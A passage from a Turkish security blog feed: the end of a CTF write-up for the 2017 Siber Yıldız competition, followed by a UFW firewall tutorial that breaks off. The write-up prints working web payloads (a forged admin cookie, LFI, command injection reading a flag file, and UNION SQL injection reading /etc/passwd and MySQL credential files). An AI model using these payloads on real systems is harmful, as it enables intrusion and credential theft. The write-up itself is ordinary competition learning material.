&lt;p&gt;Sayfa içerisinde gezinirken bir yandan da headerı kontrol ediyordum. Header içerisinde isAdmin=cfcd208495d565ef66e7dff9f98764da şeklinde tanımlanmış bir cookie bilgisine ulaştık. &lt;strong&gt;cfcd208495d565ef66e7dff9f98764da&lt;/strong&gt; md5 değerini çözünce 0 olarak gördük. Yani &lt;strong&gt;isAdmin=md5(1)&lt;/strong&gt; yapmamız durumunda hak yükseltebilirdik. &lt;strong&gt;isAdmin=c4ca4238a0b923820dcc509a6f75849b&lt;/strong&gt; şeklinde isteklerimizi gönderdiğimizde bilgiler.php dosyasında flage ulaştık.&lt;/p&gt;
&lt;h2&gt;4. Şimdi de uygulamanın kullandığı veritabanı parolası lazım.&lt;/h2&gt;
&lt;p&gt;Bu soruya giriş yaptığımızda "404 NOT Found" hata sayfası ile karşılaşılıyordu. Sayfanın kaynağını incelediğimiz de CSS ile gizlenmiş şekilde bir form yer alıyordu.&lt;/p&gt;
&lt;p&gt;&lt;img alt="" src="assets/images/siberyildiz/soru4/sanayihirsizligi-2.png" /&gt;&lt;/p&gt;
&lt;p&gt;Görünür hale getirdikten sonra "&lt;strong&gt;admin&lt;/strong&gt;","&lt;strong&gt;admin&lt;/strong&gt;" ikisiyle içeri girdik.&lt;/p&gt;
&lt;p&gt;Bilet Satış Platformunda başlığında bir sayfaya yönlendirildik. Bu sayfada "&lt;strong&gt;index.php?file=firmalar.php&lt;/strong&gt;", "&lt;strong&gt;index.php?file=sitekullanimi.php&lt;/strong&gt;" gibi URL bilgilerini görünce LFI olduğunu doğrudan anladık.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;index.php?file=firmalar.php&lt;/strong&gt; sayfası üzerinde almış olduğumuz &lt;strong&gt;/home/sites/siberyildiz/files/inc/pages/firmalar.php syntax error on line 11&lt;/strong&gt; hatası ise dizini tespit etmemize yardımcı oldu. Bulunduğumuz dizinin pages dizini olduğunu gördük.&lt;/p&gt;
&lt;p&gt;&lt;img alt="" src="assets/images/siberyildiz/soru4/soru4-2.jpg" /&gt;&lt;/p&gt;
&lt;p&gt;Genellikle web geliştirici veritabanı bağlantı bilgilerini "includes","inc","db" gibi klasörler altında "&lt;strong&gt;ayar.php&lt;/strong&gt;","&lt;strong&gt;ayarlar.php&lt;/strong&gt;","&lt;strong&gt;connect.php&lt;/strong&gt;","&lt;strong&gt;conn.php&lt;/strong&gt;","&lt;strong&gt;db.php&lt;/strong&gt;" gibi dosya isimlerinde tutmaktadır. Bu teoriden yola çıkarak bir üst dizine çıkmamızı ve db.php dosyasını içeri çağıran URL ile birlikte &lt;strong&gt;index.php?file=../db.php&lt;/strong&gt; kolayca flagi elde ettik.&lt;/p&gt;
&lt;p&gt;&lt;img alt="" src="assets/images/siberyildiz/soru4/sanayihirsizligi-3.png" /&gt;&lt;/p&gt;
&lt;p&gt;Kahraman Şehidimiz &lt;strong&gt;Ömer Halis DEMİR&lt;/strong&gt;'e Allah'dan rahmet diliyoruz.&lt;/p&gt;
&lt;h2&gt;11. Bu görev önünde iki seçenek var : başarılı olursun veya olamazsın?&lt;/h2&gt;
&lt;p&gt;Bu soruya giriş yapıldığında "nothing here" şeklinde bir ibare karşılıyordu. Ne olabilir diye düşünürken robots.txt dosyasını görüntüledik. İçerisinde yer alan Disallow: cannotfindme bilgisi üzerine cannotfindme dizinine geçtik. Burada ufak bir giriş alanı gördük.&lt;/p&gt;
&lt;p&gt;&lt;img alt="" src="assets/images/siberyildiz/soru11/1.png" /&gt;&lt;/p&gt;
&lt;p&gt;Kullanıcı adı "admin" olarak giriş yaptığımızda, yeni bir alan ve form açıldı.&lt;/p&gt;
&lt;p&gt;&lt;img alt="" src="assets/images/siberyildiz/soru11/2.png" /&gt;&lt;/p&gt;
&lt;p&gt;Giriş yaptığımız yerde bizden komut çalıştırılması isteniyordu. http://www.hedef.com/?pass=sifre&amp;amp;cmd=ls şeklinde oluşan link üzerinde pass değişkenini brute force uygulamak CTF mantığımıza aykırı gelmişti.&lt;/p&gt;
&lt;p&gt;Kısa süre sonra array injection ile birlikte ?pass[]=&amp;amp;cmd=ls olarak dosyaları listelemeyi başardık. İlgili dizinde &lt;strong&gt;"index.php"&lt;/strong&gt;,&lt;strong&gt;"readme.txt"&lt;/strong&gt; ve &lt;strong&gt;"try.html"&lt;/strong&gt; dosyalarının olduğunu gördüm. &lt;strong&gt;try.html&lt;/strong&gt; dosyası içerisinde &lt;strong&gt;read file /tmp/isThatFlag.txt&lt;/strong&gt; ifadesi yer alıyor fakat sistem &lt;strong&gt;ls&lt;/strong&gt; harici komut çalıştırmamıza izin vermiyordu.&lt;/p&gt;
&lt;p&gt;Bunun üzerine /tmp altındaki &lt;strong&gt;isThatFlag.txt&lt;/strong&gt; dosyasını okumak için new line yani bir alt satıra geç ifadesinin encode değeri olan &lt;strong&gt;%0a&lt;/strong&gt; ifadesini kullandık. &lt;strong&gt;http://hedef.com/cannotfindme/?pass[]=&amp;amp;cmd=ls%0acat%20/tmp/isThatFlag.txt&lt;/strong&gt; ile birlikte flagi elde ettik.&lt;/p&gt;
&lt;h2&gt;12. Yapabileceğine inancımız tam.?&lt;/h2&gt;
&lt;p&gt;&lt;img alt="" src="assets/images/siberyildiz/soru12/1.jpg" /&gt;&lt;/p&gt;
&lt;p&gt;Bu soruda ise resimden göreceğiniz üzere iki adet bağlantı yer almaktadır. Ek olarak index.php?id=1 bağlantısı üzerinden dosya indirebileceğimiz söylenmektedir. Bağlantıya tıkladığımızda "a.jpg" isimli boş bir dosyanın indirildiğini görüyoruz.&lt;/p&gt;
&lt;p&gt;Muhtemelen aşağıdaki şekilde bir SQL sorgusu arka planda işlemektedir.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;select&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;from&lt;/span&gt; &lt;span class="n"&gt;files&lt;/span&gt; &lt;span class="n"&gt;where&lt;/span&gt; &lt;span class="n"&gt;id&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Biz bunu şu şekilde yaparsak dosya indirebiliriz.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;select&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;from&lt;/span&gt; &lt;span class="n"&gt;files&lt;/span&gt; &lt;span class="n"&gt;where&lt;/span&gt; &lt;span class="n"&gt;id&lt;/span&gt;&lt;span class="o"&gt;=-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="err"&gt;&amp;#39;&lt;/span&gt; &lt;span class="n"&gt;UNION&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;etc&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;passwd&lt;/span&gt;&lt;span class="err"&gt;&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="mi"&gt;23&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Bir UNION SQL injection kuralı gereği ilk sorguda kaç kolon dönüyorsa, ikinci sorguda aynı sayıda kolonun dönmesi gerekmektedir. Bu yüzden UNION'dan sonra 1 ifadesini yalnızca kolon olması adına ekledik.&lt;/p&gt;
&lt;p&gt;&lt;img alt="" src="assets/images/siberyildiz/soru12/2.jpg" /&gt;&lt;/p&gt;
&lt;p&gt;Biraz uğraşın ardında diğer sayfalarda yer alan SQL bağlantı hataları izlenimindeki ifadeler üzerinden "users" veritabanına girebilmek adına yedeklerine ulaşmak için /var/lib/mysql/ altından ilgili veritabanı ve tablo bilgilerini indirdik. /var/lib/mysql dizini altında veritabanları, kolonlar ve içerikleri yer almaktadır.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;select&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;from&lt;/span&gt; &lt;span class="n"&gt;files&lt;/span&gt; &lt;span class="n"&gt;where&lt;/span&gt; &lt;span class="n"&gt;id&lt;/span&gt;&lt;span class="o"&gt;=-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="err"&gt;&amp;#39;&lt;/span&gt; &lt;span class="n"&gt;UNION&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;var&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;lib&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;mysql&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;users&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;login&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;MYD&lt;/span&gt;&lt;span class="err"&gt;&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="mi"&gt;23&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Elde ettiğimiz login.MYD dosyasını string ile okuduğumuzda giriş bilgilerini elde ettik.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;mustafaaltinkaynak&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="n"&gt;mustafaaltinkaynak$&lt;/span&gt; &lt;span class="n"&gt;strings&lt;/span&gt; &lt;span class="n"&gt;login&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;MYD&lt;/span&gt;
&lt;span class="n"&gt;admin&lt;/span&gt;
&lt;span class="n"&gt;bu1Parolami&lt;/span&gt;&lt;span class="o"&gt;?&lt;/span&gt;&lt;span class="n"&gt;Sence&lt;/span&gt;&lt;span class="o"&gt;?&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Elde ettiğimiz bu bilgiyi ikinci bağlantıda yer alan ?username=DENEME&amp;amp;password=deneme ile giriş yapabilirsiniz ibaresinin yer aldığı kısıma GET isteği şeklinde gönderdiğimizde flagi elde ettik.&lt;/p&gt;
&lt;p&gt;&lt;img alt="" src="assets/images/siberyildiz/soru12/4.jpg" /&gt;&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">admin</dc:creator><pubDate>Mon, 23 Jan 2017 23:40:00 +0200</pubDate><guid>tag:,2017-01-23:btk-usom-siber-yildiz-yarismasi-cozumleri.html</guid><category>siberyildiz</category><category>USOM</category><category>BTK</category><category>siber güvenlik yarışması</category></item><item><title>UFW Kurulumu ve Yapılandırma</title><link>/ufw-kurulumu-ve-yapilandirma.html</link><description>&lt;h2&gt;UFW nedir?&lt;/h2&gt;
&lt;p&gt;UFW yani Uncomplicated Firewall güvenlik duvarı yönetim aracıdır. Iptables güvenlik duvarı yapılandırmasını kolaylaştırmak için geliştirilen ufw, ipv4 veya v6 ile desteğiyle birlikte kullanıcıların işini epeyi kolaylaştırmaktadır. Varsayılan olarak UFW devre dışı olarak gelmektedir. UFW'yi konsol üzerinden yönetebileceğiniz gibi GUI desteği sayesinde konsol kullanmadan &lt;a href="https://help.ubuntu.com/community/Gufw"&gt;Gufw&lt;/a&gt; ile de yönetebilirsiniz. Ubuntu için varsayılan güvenlik duvarı yapılandırma aracıdır.&lt;/p&gt;
&lt;h2&gt;UFW kurulumu&lt;/h2&gt;
&lt;p&gt;UFW ubuntu üzerinde varsayılan geldiğinden dolayı farklı bir işletim sistemi kuruyorsanız aşağıdaki adımı izleyebilirsiniz.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;mustafa&lt;/span&gt;&lt;span class="err"&gt;@&lt;/span&gt;&lt;span class="n"&gt;altinkaynak&lt;/span&gt;&lt;span class="o"&gt;:/&lt;/span&gt;&lt;span class="err"&gt;#&lt;/span&gt; &lt;span class="n"&gt;apt&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt; &lt;span class="n"&gt;install&lt;/span&gt; &lt;span class="n"&gt;ufw&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Kurulum işleminin ardından aşağıdaki komut ile birlikte versiyon kontrolü sağlayabilirsiniz.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;mustafa&lt;/span&gt;&lt;span class="err"&gt;@&lt;/span&gt;&lt;span class="n"&gt;altinkaynak&lt;/span&gt;&lt;span class="o"&gt;:/&lt;/span&gt;&lt;span class="err"&gt;#&lt;/span&gt; &lt;span class="n"&gt;ufw&lt;/span&gt; &lt;span class="n"&gt;version&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;strong&gt;ÖNEMLİ:&lt;/strong&gt; Eğer ki ev kullanıcı iseniz UFW sizler için varsayılan bir profil ile birlikte sisteminize dahil olmaktadır. Kısacası, ev kullanıcıları için istisnalar dışında tüm gelen istekler reddedilmektedir.&lt;/p&gt;
&lt;h2&gt;UFW yönetimi&lt;/h2&gt;
&lt;p&gt;UFW'yi etkinleştirmek yada pasifleştirmek için aşağıdaki komutu kullanabilirsiniz.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;mustafa&lt;/span&gt;&lt;span class="err"&gt;@&lt;/span&gt;&lt;span class="n"&gt;altinkaynak&lt;/span&gt;&lt;span class="o"&gt;:/&lt;/span&gt;&lt;span class="err"&gt;#&lt;/span&gt; &lt;span class="n"&gt;ufw&lt;/span&gt; &lt;span class="n"&gt;enable&lt;/span&gt;
&lt;span class="n"&gt;Firewall&lt;/span&gt; &lt;span class="n"&gt;is&lt;/span&gt; &lt;span class="n"&gt;active&lt;/span&gt; &lt;span class="n"&gt;and&lt;/span&gt; &lt;span class="n"&gt;enabled&lt;/span&gt; &lt;span class="n"&gt;on&lt;/span&gt; &lt;span class="n"&gt;system&lt;/span&gt; &lt;span class="n"&gt;startup&lt;/span&gt;

&lt;span class="n"&gt;mustafa&lt;/span&gt;&lt;span class="err"&gt;@&lt;/span&gt;&lt;span class="n"&gt;altinkaynak&lt;/span&gt;&lt;span class="o"&gt;:/&lt;/span&gt;&lt;span class="err"&gt;#&lt;/span&gt; &lt;span class="n"&gt;ufw&lt;/span&gt; &lt;span class="n"&gt;disable&lt;/span&gt;
&lt;span class="n"&gt;Firewall&lt;/span&gt; &lt;span class="n"&gt;stopped&lt;/span&gt; &lt;span class="n"&gt;and&lt;/span&gt; &lt;span class="n"&gt;disabled&lt;/span&gt; &lt;span class="n"&gt;on&lt;/span&gt; &lt;span class="n"&gt;system&lt;/span&gt; &lt;span class="n"&gt;startup&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Mevcut UFW'ye ait kurallar dizisini görmek için aşağıdaki komutu kullanabilirsiniz.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;mustafa&lt;/span&gt;&lt;span class="err"&gt;@&lt;/span&gt;&lt;span class="n"&gt;altinkaynak&lt;/span&gt;&lt;span class="o"&gt;:/&lt;/span&gt;&lt;span class="err"&gt;#&lt;/span&gt; &lt;span class="n"&gt;ufw&lt;/span&gt; &lt;span class="n"&gt;status&lt;/span&gt; &lt;span class="n"&gt;verbose&lt;/span&gt;
&lt;span class="nl"&gt;Status:&lt;/span&gt; &lt;span class="n"&gt;active&lt;/span&gt;
&lt;span class="nl"&gt;Logging:&lt;/span&gt; &lt;span class="n"&gt;on&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;full&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="nl"&gt;Default:&lt;/span&gt; &lt;span class="n"&gt;deny&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;incoming&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="n"&gt;allow&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;outgoing&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="n"&gt;disabled&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;routed&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;New&lt;/span&gt; &lt;span class="n"&gt;profiles&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;skip&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Henüz bir kural tanımlamadığımız kurallar dizisi görünmemektedir. Ancak UFW'nin mevcut durumuna ilişkin bilgi sahibi olabileceğimiz bilgiler yer almaktadır. Firewall'ın durumu, loglama hassasiyeti, ön tanımlı davranışını bu çıktı da yer almaktadır.&lt;/p&gt;
&lt;p&gt;Kural içerikleri &lt;strong&gt;"/etc/ufw"&lt;/strong&gt; altında &lt;strong&gt;".rules"&lt;/strong&gt; uzantısı ile biten dosyalarda yer almaktadır.&lt;/p&gt;
&lt;h2&gt;Kural oluşturma&lt;/h2&gt;
&lt;p&gt;UFW üzerinde iki farklı davranış allow, deny belirleyebilirsiniz. Allow ile izin verebilir, deny ile gelen istekleri reddedebilirsiniz.&lt;/p&gt;
&lt;p&gt;Allow içeren kurallar aşağıdaki şekilde tanımlanabilir.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nx"&gt;ufw&lt;/span&gt; &lt;span class="nx"&gt;allow&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nb"&gt;port&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;/&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;optional&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="nx"&gt;protocol&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;53.port üzerine gelen TCP ve UDP bağlantılarına izin verelim.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;mustafa&lt;/span&gt;&lt;span class="err"&gt;@&lt;/span&gt;&lt;span class="n"&gt;altinkaynak&lt;/span&gt;&lt;span class="o"&gt;:/&lt;/span&gt;&lt;span class="err"&gt;#&lt;/span&gt; &lt;span class="n"&gt;ufw&lt;/span&gt; &lt;span class="n"&gt;allow&lt;/span&gt; &lt;span class="mi"&gt;53&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Yalnızca TCP üzerinden gelen bağlantılara izin vermek için,&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;mustafa&lt;/span&gt;&lt;span class="err"&gt;@&lt;/span&gt;&lt;span class="n"&gt;altinkaynak&lt;/span&gt;&lt;span class="o"&gt;:/&lt;/span&gt;&lt;span class="err"&gt;#&lt;/span&gt; &lt;span class="n"&gt;ufw&lt;/span&gt; &lt;span class="n"&gt;allow&lt;/span&gt; &lt;span class="mi"&gt;53&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;tcp&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Yalnızca UDP üzerinden gelen bağlantılara izin vermek için,&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;mustafa&lt;/span&gt;&lt;span class="err"&gt;@&lt;/span&gt;&lt;span class="n"&gt;altinkaynak&lt;/span&gt;&lt;span class="o"&gt;:/&lt;/span&gt;&lt;span class="err"&gt;#&lt;/span&gt; &lt;span class="n"&gt;ufw&lt;/span&gt; &lt;span class="n"&gt;allow&lt;/span&gt; &lt;span class="mi"&gt;53&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;tcp&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Deny içeren kurallar aşağıdaki şekilde tanımlanabilir.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nx"&gt;ufw&lt;/span&gt; &lt;span class="nx"&gt;deny&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nb"&gt;port&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;/&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;optional&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="nx"&gt;protocol&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;53.port üzerine gelen TCP ve UDP bağlantılarını engelleyelim.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;mustafa&lt;/span&gt;&lt;span class="err"&gt;@&lt;/span&gt;&lt;span class="n"&gt;altinkaynak&lt;/span&gt;&lt;span class="o"&gt;:/&lt;/span&gt;&lt;span class="err"&gt;#&lt;/span&gt; &lt;span class="n"&gt;ufw&lt;/span&gt; &lt;span class="n"&gt;deny&lt;/span&gt; &lt;span class="mi"&gt;53&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Yalnızca TCP üzerinden gelen bağlantıları engellemek için,&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;mustafa&lt;/span&gt;&lt;span class="err"&gt;@&lt;/span&gt;&lt;span class="n"&gt;altinkaynak&lt;/span&gt;&lt;span class="o"&gt;:/&lt;/span&gt;&lt;span class="err"&gt;#&lt;/span&gt; &lt;span class="n"&gt;ufw&lt;/span&gt; &lt;span class="n"&gt;deny&lt;/span&gt; &lt;span class="mi"&gt;53&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;tcp&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Yalnızca UDP üzerinden gelen bağlantıları engellemek için,&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;mustafa&lt;/span&gt;&lt;span class="err"&gt;@&lt;/span&gt;&lt;span class="n"&gt;altinkaynak&lt;/span&gt;&lt;span class="o"&gt;:/&lt;/span&gt;&lt;span class="err"&gt;#&lt;/span&gt; &lt;span class="n"&gt;ufw&lt;/span&gt; &lt;span class="n"&gt;deny&lt;/span&gt; &lt;span class="mi"&gt;53&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;udp&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Belirli Subnet'e izin verelim.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;mustafa&lt;/span&gt;&lt;span class="err"&gt;@&lt;/span&gt;&lt;span class="n"&gt;altinkaynak&lt;/span&gt;&lt;span class="o"&gt;:/&lt;/span&gt;&lt;span class="err"&gt;#&lt;/span&gt; &lt;span class="n"&gt;ufw&lt;/span&gt; &lt;span class="n"&gt;allow&lt;/span&gt; &lt;span class="n"&gt;from&lt;/span&gt; &lt;span class="mf"&gt;192.168.1.0&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="mi"&gt;24&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Belirlenmiş bir IP adresine erişim izni verelim.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;mustafa&lt;/span&gt;&lt;span class="err"&gt;@&lt;/span&gt;&lt;span class="n"&gt;altinkaynak&lt;/span&gt;&lt;span class="o"&gt;:/&lt;/span&gt;&lt;span class="err"&gt;#&lt;/span&gt; &lt;span class="n"&gt;ufw&lt;/span&gt; &lt;span class="n"&gt;allow&lt;/span&gt; &lt;span class="n"&gt;from&lt;/span&gt; &lt;span class="mf"&gt;10.50.1.55&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Belirlenmiş bir IP adresine yalnızca bir port için izin verelim.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;mustafa&lt;/span&gt;&lt;span class="err"&gt;@&lt;/span&gt;&lt;span class="n"&gt;altinkaynak&lt;/span&gt;&lt;span class="o"&gt;:/&lt;/span&gt;&lt;span class="err"&gt;#&lt;/span&gt; &lt;span class="n"&gt;ufw&lt;/span&gt; &lt;span class="n"&gt;allow&lt;/span&gt; &lt;span class="n"&gt;from&lt;/span&gt; &lt;span class="mf"&gt;10.50.1.55&lt;/span&gt; &lt;span class="n"&gt;to&lt;/span&gt; &lt;span class="n"&gt;any&lt;/span&gt; &lt;span class="n"&gt;port&lt;/span&gt; &lt;span class="mi"&gt;22&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;RFC1918 adresleri yani 10.0.0.0/8, 172.16.0.0/12, 169.254.0.0/16, 192.168.0.0/16 olarak belirlenen adreslere izin verelim.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;mustafa&lt;/span&gt;&lt;span class="err"&gt;@&lt;/span&gt;&lt;span class="n"&gt;altinkaynak&lt;/span&gt;&lt;span class="o"&gt;:/&lt;/span&gt;&lt;span class="err"&gt;#&lt;/span&gt; &lt;span class="n"&gt;ufw&lt;/span&gt; &lt;span class="n"&gt;allow&lt;/span&gt; &lt;span class="n"&gt;from&lt;/span&gt; &lt;span class="mf"&gt;10.0.0.0&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="mi"&gt;8&lt;/span&gt;
&lt;span class="n"&gt;Rule&lt;/span&gt; &lt;span class="n"&gt;added&lt;/span&gt;
&lt;span class="n"&gt;mustafa&lt;/span&gt;&lt;span class="err"&gt;@&lt;/span&gt;&lt;span class="n"&gt;altinkaynak&lt;/span&gt;&lt;span class="o"&gt;:/&lt;/span&gt;&lt;span class="err"&gt;#&lt;/span&gt; &lt;span class="n"&gt;ufw&lt;/span&gt; &lt;span class="n"&gt;allow&lt;/span&gt; &lt;span class="n"&gt;from&lt;/span&gt; &lt;span class="mf"&gt;172.16.0.0&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="mi"&gt;12&lt;/span&gt;
&lt;span class="n"&gt;Rule&lt;/span&gt; &lt;span class="n"&gt;added&lt;/span&gt;
&lt;span class="n"&gt;mustafa&lt;/span&gt;&lt;span class="err"&gt;@&lt;/span&gt;&lt;span class="n"&gt;altinkaynak&lt;/span&gt;&lt;span class="o"&gt;:/&lt;/span&gt;&lt;span class="err"&gt;#&lt;/span&gt; &lt;span class="n"&gt;ufw&lt;/span&gt; &lt;span class="n"&gt;allow&lt;/span&gt; &lt;span class="n"&gt;from&lt;/span&gt; &lt;span class="mf"&gt;192.168.0.0&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="mi"&gt;16&lt;/span&gt;
&lt;span class="n"&gt;Rule&lt;/span&gt; &lt;span class="n"&gt;added&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Bazı durumlarda kuralların birbirlerini bastırdığı durumlar olabilir. Örneğin: SSH bağlantılarını tümüyle kapatan bir kural eklediniz. Akabinde de spesifik bir adres için SSH izni verdiniz. Bu durumda ilk eklediğiniz kural gerçekleşecektir ve spesifik IP adresi bağlantı gerçekleştiremeyecektir.&lt;/p&gt;
&lt;p&gt;Bu durumda araya kural eklemesi yapabilirsiniz.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;mustafa&lt;/span&gt;&lt;span class="err"&gt;@&lt;/span&gt;&lt;span class="n"&gt;altinkaynak&lt;/span&gt;&lt;span class="o"&gt;:/&lt;/span&gt;&lt;span class="err"&gt;#&lt;/span&gt; &lt;span class="n"&gt;ufw&lt;/span&gt; &lt;span class="n"&gt;insert&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt; &lt;span class="n"&gt;allow&lt;/span&gt; &lt;span class="n"&gt;from&lt;/span&gt; &lt;span class="mf"&gt;10.50.1.55&lt;/span&gt; &lt;span class="n"&gt;to&lt;/span&gt; &lt;span class="n"&gt;any&lt;/span&gt; &lt;span class="n"&gt;port&lt;/span&gt; &lt;span class="mi"&gt;22&lt;/span&gt;
&lt;span class="n"&gt;Rule&lt;/span&gt; &lt;span class="n"&gt;inserted&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Belirli bir IP adresi veya subnet için protokol sınırlaması getirelim.&lt;/p&gt;
